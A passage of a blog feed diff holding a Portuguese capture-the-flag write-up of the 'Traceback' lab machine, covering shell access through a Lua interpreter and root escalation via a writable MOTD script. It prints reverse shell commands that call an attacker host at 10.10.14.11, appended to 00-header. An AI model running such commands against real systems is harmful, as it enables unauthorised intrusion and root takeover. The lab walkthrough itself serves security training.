+Retornou um erro mas temos algo interessante um tal de &lt;strong&gt;repl.lua&lt;/strong&gt;, pensei deve ser algo com a linguagem lua, tentei fazer ele exibir um texto na tela com o print para ver se esse prompt era algum tipo de interpretador lua.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/luvit-print.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Maravilha retornou nossa string e imprimiu na tela, então fui no &lt;strong&gt;GOOGLE&lt;/strong&gt; e pesquisei sobre execução de comandos em lua e achei uma função chamada os.execute() e fui testar.&lt;/p&gt;
+
+&lt;p&gt;obs(&lt;em&gt;Nunca programei em lua creio que isso seja uma função se não for sorry hahaha&lt;/em&gt;)&lt;/p&gt;
+
+&lt;p&gt;Mando ele executar o comando &lt;strong&gt;id&lt;/strong&gt; com a &lt;em&gt;função&lt;/em&gt; &lt;strong&gt;os.execute()&lt;/strong&gt; .
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/luvit-id.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Retornou o id do sysadmin isso comprova que o programa roda como usuario sysadmin durante sua execução e o “interpretador” reconhece a “função” &lt;strong&gt;os.execute()&lt;/strong&gt;, agora basta mandar ele executar e retornar nosso tão esperado shell &lt;strong&gt;/bin/bash&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/traceback/luvit-bash.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Perfeito shell do sysadmin :)
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a &lt;strong&gt;FLAG&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/home/sysadmin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 7348
+drwxr-x--- 5 sysadmin sysadmin    4096 May 19 19:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 sysadmin sysadmin    1021 May 19 20:15 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 sysadmin sysadmin     220 Apr  4  2018 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 sysadmin sysadmin    3771 Apr  4  2018 .bashrc
+drwx------ 2 sysadmin sysadmin    4096 Aug 25  2019 .cache
+drwxrwxr-x 3 sysadmin sysadmin    4096 Aug 24  2019 .local
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 sysadmin sysadmin 4397566 Aug 24  2019 luvit
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 sysadmin sysadmin     807 Apr  4  2018 .profile
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 sysadmin sysadmin 3078592 May 19 19:36 pspy64
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 sysadmin sysadmin     150 May 19 19:30 script.lua
+drwxr-xr-x 2 root     root        4096 Aug 25  2019 .ssh
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 sysadmin sysadmin      33 May 19 18:07 user.txt
+sysadmin@traceback:/home/sysadmin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+651xxxxx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;rumo-ao-privesc&quot;&gt;RUMO AO PRIVESC&lt;/h2&gt;
+
+&lt;p&gt;Agora temos que descobrir uma forma de conseguir escalar nosso privilégio para conseguir a flag de root.&lt;/p&gt;
+
+&lt;p&gt;Comecei verificando quais processos estão rodando como &lt;strong&gt;root&lt;/strong&gt; .
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/home/sysadmin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps aux | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;root
+...
+...
+...
+
+root      33224  0.0  0.0   4628   868 ?        S    01:21   0:00 sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/env &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts &lt;span class=&quot;nt&quot;&gt;--lsbsysinit&lt;/span&gt; /etc/update-motd.d &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /run/motd.dynamic.new
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Temos um processo aqui que podemos usar como vetor de ataque para conseguir um privesc, vamos olhar o &lt;strong&gt;/etc/update-motd.d&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 24
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 root sysadmin  981 May 19 20:57 00-header
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 root sysadmin  982 May 19 20:57 10-help-text
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 root sysadmin 4264 May 19 20:57 50-motd-news
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 root sysadmin  604 May 19 20:57 80-esm
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 root sysadmin  299 May 19 20:57 91-release-upgrade
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Observando vejo que tenho permissão de escrita &lt;strong&gt;‘w’&lt;/strong&gt;  para o grupo &lt;strong&gt;sysadmin&lt;/strong&gt; em todos arquivos.&lt;/p&gt;
+
+&lt;p&gt;Olhando um dos arquivos o &lt;strong&gt;00-header&lt;/strong&gt; vejo que ele é um &lt;em&gt;shellscript&lt;/em&gt; e executa comandos dentro dele como o &lt;strong&gt;echo&lt;/strong&gt; por exexplo.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;00-header 
+&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    00-header - create the header of the MOTD&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    Copyright (C) 2009-2010 Canonical Ltd.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    Authors: Dustin Kirkland &amp;lt;kirkland@canonical.com&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    This program is free software; you can redistribute it and/or modify&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    it under the terms of the GNU General Public License as published by&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    the Free Software Foundation; either version 2 of the License, or&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    (at your option) any later version.&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /etc/lsb-release &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; /etc/lsb-release
+
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Welcome to Xh4H land &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Já que ele é um shellscript e executa comandos &lt;em&gt;(Óbvio né já que é um shellscript hehe)&lt;/em&gt; vamos adicionar uma linha para que ele execute um comando de shellreversa como usuário root para nossa máquina :).
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/4455 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; 00-header
+sysadmin@traceback:/etc/update-motd.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;00-header 
+&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    00-header - create the header of the MOTD&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    Copyright (C) 2009-2010 Canonical Ltd.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    Authors: Dustin Kirkland &amp;lt;kirkland@canonical.com&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    This program is free software; you can redistribute it and/or modify&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    it under the terms of the GNU General Public License as published by&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    the Free Software Foundation; either version 2 of the License, or&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    (at your option) any later version.&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /etc/lsb-release &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; /etc/lsb-release
+
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Welcome to Xh4H land &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.11/4455 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Obs. &lt;em&gt;Aqui perdi algum tempo por dois motivos&lt;/em&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Primeiro para entender o vetor de ataque, temos que colocar o comando de shell reversa no arquivo, mas ele só será executado quando você realizar um login por ssh já que o arquivo &lt;strong&gt;00-header&lt;/strong&gt; só é executado após esse processo, como nesse exemplo quando loguei após adicionar a chave pública no servidor.
+&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kali@kali]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; corvo webadmin@10.10.10.181
+&lt;span class=&quot;c&quot;&gt;#################################&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; OWNED BY XH4H  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;
+- I guess stuff could have been configured better ^^ -
+&lt;span class=&quot;c&quot;&gt;#################################&lt;/span&gt;
+
+Welcome to Xh4H land 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Obeserve a mensagem &lt;strong&gt;Welcome to Xh4H land&lt;/strong&gt; essa mensagem é feito pelo comando &lt;strong&gt;echo “\nWelcome to Xh4H land \n”&lt;/strong&gt; que se encontra dentro do arquivo  &lt;strong&gt;00-header&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Beleza, então entendemos que o vetor de ataque é através do arquivo  &lt;strong&gt;00-header&lt;/strong&gt; que será executado quando realizar um login, por isso não adianta só adicionar nossa shellreversa lá dentro temos que logar logo em seguida , mas ai temos o primeiro obstáculo. Essa modificação que fazemos no arquivo &lt;strong&gt;00-header&lt;/strong&gt; não dura muito tempo o sistema restaura ele após alguns segundos e a conexão remota com ssh não é muito rápida tem que ter um time certo.
+Para resolver isso criei chaves novas com o usuário webadmin em /tmp/privesc
+&lt;br /&gt;&lt;br /&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@traceback:/tmp/privesc&lt;span class=&quot;nv&quot;&gt;$ssh&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-keygen&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Assim a conexão sendo localmente seria extramamente mais rápida e dando tempo certo, mas…&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Segunda dificuldade mesmo com processo agora rápido não estava retornando shell, até descobrir que o comando de shell reversa em sua forma padrão não estava funcionando.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/4455 0&amp;gt;&amp;amp;1’&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Tinha que fazer esse comando ser executado por um bash.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/4455 0&amp;gt;&amp;amp;1’&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Então coloquei esse novo comando no arquivo &lt;strong&gt;00-header&lt;/strong&gt; e loguei por ssh localmente.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/4455 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; 00-header
+sysadmin@traceback:/etc/update-motd.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;00-header 
+&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    00-header - create the header of the MOTD&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    Copyright (C) 2009-2010 Canonical Ltd.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    Authors: Dustin Kirkland &amp;lt;kirkland@canonical.com&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    This program is free software; you can redistribute it and/or modify&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    it under the terms of the GNU General Public License as published by&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    the Free Software Foundation; either version 2 of the License, or&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    (at your option) any later version.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    This program is distributed in the hope that it will be useful,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    but WITHOUT ANY WARRANTY; without even the implied warranty of&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    GNU General Public License for more details.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    You should have received a copy of the GNU General Public License along&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    with this program; if not, write to the Free Software Foundation, Inc.,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /etc/lsb-release &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; /etc/lsb-release
+
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Welcome to Xh4H land &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/4455 0&amp;gt;&amp;amp;1'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Realizo logo em seguida em outro terminal uma conexão do webadmin para ele mesmo via ssh localmente.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webadmin@traceback:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh localhost &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; teste
+&lt;span class=&quot;c&quot;&gt;#################################&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; OWNED BY XH4H  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;
+- I guess stuff could have been configured better ^^ -
+&lt;span class=&quot;c&quot;&gt;#################################&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# TRAVOU AQUI O TERMINAL&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Agora em outro terminal com &lt;em&gt;Netcat&lt;/em&gt; temos nossa shell como &lt;em&gt;ROOT&lt;/em&gt; .
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Listening on any address 4455 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;prchat-user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Connection from 10.10.10.181:35646
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7637&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+root@traceback:/# 
+
+
+root@traceback:/root# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 40
+drwx------  5 root root 4096 Aug 25  2019 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root   67 Jan 24 05:49 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Aug 24  2019 .cache
+drwxr-xr-x  3 root root 4096 Aug 24  2019 .local
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  148 Aug 17  2015 .profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   66 Aug 25  2019 .selected_editor
+drwxr-xr-x  2 root root 4096 Aug 24  2019 .ssh
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root root   33 May 19 21:25 root.txt
+root@traceback:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
+b05xxx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Autor: Sandro M. Silva aka CorvodaMorte&lt;/p&gt;
 </description>
-        <pubDate>Wed, 04 Dec 2019 15:59:00 -0300</pubDate>
-        <link>https://darkshellcode.github.io//blog/teste/</link>
-        <guid isPermaLink="true">https://darkshellcode.github.io//blog/teste/</guid>
+        <pubDate>Sat, 22 Aug 2020 13:30:00 -0300</pubDate>
+        <link>http://localhost:4000//blog/traceback/</link>
+        <guid isPermaLink="true">http://localhost:4000//blog/traceback/</guid>
         
         <category>writeup</category>
         
